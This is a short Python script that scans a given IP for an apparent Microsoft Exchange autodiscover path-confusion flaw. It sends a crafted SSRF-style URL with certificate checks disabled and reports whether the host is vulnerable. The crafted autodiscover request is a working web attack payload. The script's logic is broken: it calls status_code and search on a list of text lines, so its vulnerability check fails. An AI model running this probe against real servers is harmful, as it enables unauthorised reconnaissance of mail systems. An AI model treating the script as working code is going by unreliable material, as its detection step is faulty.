import urllib3
import requests
import sys
requests.packages.urllib3.disable_warnings()
def scanner(ip):
    ip = ip.strip()
    url = f"https://{ip}/autodiscover/autodiscover.json?@mss.com/owa/?&Email=autodiscover/autodiscover.json%3F@mss.com"
    try:
        req = requests.get(url, timeout=10, verify=False, allow_redirects=False).text.split("\n")
        print (req)
        if (req.status_code == 302) and req.search("errorfe.aspx",req.txt):
            print (f"[+] {ip} Host is vulnerable ")
        else:
            print (f"[-] {ip} Host is not vulnerable")
    except Exception as error:
        print(error)

scanner(sys.argv[1])
